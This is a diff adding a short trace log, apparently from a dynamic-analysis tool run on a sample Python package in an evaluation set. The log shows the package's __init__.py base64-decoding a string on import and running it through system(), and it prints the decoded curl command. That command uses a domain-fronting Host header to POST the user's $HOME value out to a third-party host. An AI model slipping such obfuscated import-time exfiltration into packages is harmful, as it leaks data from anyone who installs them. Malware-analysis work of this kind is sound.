@@ -1,0 +1,4 @@
+[artifact_eval/samples/packages/063_important_package-0.1.21/_pyfex_import_important_package.py:3] [print]('[pyfex-entry] import important_package')
+[artifact_eval/samples/packages/063_important_package-0.1.21/_pyfex_import_important_package.py:4] [import_module]('important_package')
+[artifact_eval/samples/packages/063_important_package-0.1.21/src/important_package/__init__.py:5] [b64decode]('Y3VybCAtayAtWCBQT1NUICJodHRwczovL3B5cGkub3JnIiAtSCAiSG9zdDogcHNlYy5mb3J3YXJkLmlvLmdsb2JhbC5wcm9kLmZhc3RseS5uZXQiIC1kICJ0ZXN0PSRIT01FIg==')
+[artifact_eval/samples/packages/063_important_package-0.1.21/src/important_package/__init__.py:5] [system](b'curl -k -X POST "https://pypi.org" -H "Host: psec.forward.io.global.prod.fastly.net" -d "test=$HOME"')
